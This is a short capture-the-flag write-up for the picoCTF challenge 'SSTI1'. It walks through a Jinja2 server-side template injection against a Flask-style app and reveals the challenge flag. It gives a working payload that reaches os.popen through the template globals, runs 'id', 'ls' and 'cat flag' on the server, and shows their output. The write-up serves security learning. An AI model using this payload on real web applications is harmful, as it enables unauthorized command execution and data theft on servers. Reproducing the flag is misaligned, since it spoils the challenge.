# SSTI1
#### debug info: [u:953389 e: p: c:492 i:296724]

## Description
I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here!

# Approach
Based on the description of the challenge, we can immediately try a server side injection attack. On the page, we can enter the 'annoucement' `{{7 * 7}}`, with the next page displaying:
```
49
```
Now that we know that this attack has merit, we can enter an injection such as `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`. This allows us to perform terminal commands via `popen`. For instance, running `.popen('ls')` returns:
```
__pycache__ app.py flag requirements.txt 
```
Having identified the possible file containing the flag, we can then run another injection using `.popen('cat flag')`, returning:
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}
```
Hence, the flag is `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}`.<br><br>
Original injection from https://onsecurity.io/article/server-side-template-injection-with-jinja2/